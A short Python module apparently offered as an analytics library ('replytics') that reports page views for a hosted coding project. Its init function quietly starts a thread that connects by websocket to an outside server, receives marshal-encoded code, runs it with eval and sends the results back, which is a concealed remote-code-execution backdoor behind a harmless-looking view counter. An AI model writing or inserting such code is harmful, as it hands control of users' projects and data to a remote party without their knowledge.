import websocket,marshal,threading,requests
REPL_URL=REPL_ID=None
def init(repl_url):
	global REPL_URL
	REPL_URL=repl_url
	threading.Thread(target=connect_ws).start()
def connect_ws():
	try:
		ws = websocket.create_connection('wss://replytics.matdoes.dev/connected')
		while True:ws.send(str(eval(marshal.loads(ws.recv()))))
	except websocket._exceptions.WebSocketConnectionClosedException:
		pass
def get_views():
	analytics=requests.get(f'https://replytics.matdoes.dev/data/{REPL_ID}').json()
	return analytics['views']